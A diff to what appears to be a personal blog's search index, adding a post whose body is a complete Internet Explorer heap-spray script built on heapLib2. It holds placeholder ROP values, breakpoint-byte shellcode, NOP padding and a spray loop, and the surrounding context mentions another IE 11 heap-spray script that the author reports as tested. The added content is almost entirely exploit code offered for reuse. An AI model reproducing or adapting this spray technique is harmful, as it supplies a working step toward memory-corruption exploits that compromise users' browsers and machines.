@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title><![CDATA[HeapLib2 Heap Spray脚本]]></title>
+      <url>http://yoursite.com/2017/03/24/HeapLib2-Heap-Spray%E8%84%9A%E6%9C%AC/</url>
+      <content type="html"><![CDATA[<p>&lt;!DOCTYPE html&gt;</p>
+<html><br><br><head><br><script type="text/javascript" src="heapLib2.js"></script><br></head><br><body><br><h1 id="wonk" data-wonk="wonky">honk</h1><br><br><script type="text/javascript"><br>    var obj = document.getElementById(“wonk”);<br><br>    //Create a heapLib2 object for Internet Explorer<br>    var heap = new heapLib2.ie(obj, 0x80000);<br>     var code = unescape(“%ucccc”);<br>     while(code.length<400) code += code;
+    code  = code.substring(0,400);
+ var rop = unescape("%u4141%u4141%u4242%u4242%u4343%u4343%u4444%u4444%u4545%u4545%u4646%u4646%u4747%u4747%u4848%u4848");
+ var pad = unescape("%u9090%u9090");
+ while (pad.length < 0x1000) pad += pad;
+
+ offset_length = 0x5E6;
+ junk_offset = pad.substring(0, offset_length);
+
+ var shellcode = junk_offset + rop + code + pad.substring(0, 0x800 - code.length - junk_offset.length - rop.length);
+ while (shellcode.length < 0x40000) shellcode += shellcode;
+ var block = shellcode.substring(2, 0x40000 - 0x21);
+    for (var i = 0; i < 0x500; i++){
+            //this will bypass the cache allocator
+            heap.sprayalloc("big_attr"+i, block); 
+    }
+    heap.free("big_attr0");
+    alert("HeapLib2 done");
+</script><br></body><br><br></html>]]></content>
+    </entry>
+    
+    <entry>
       <title><![CDATA[IE 11 Heap Spray脚本]]></title>
       <url>http://yoursite.com/2017/03/20/IE-11-Heap-Spray%E8%84%9A%E6%9C%AC/</url>
       <content type="html"><![CDATA[<p>由于网上找不到IE最新版本的堆喷射脚本，自己查找资料找到，稍微改了下，win7 sp1 IE 11 亲测可用。</p>
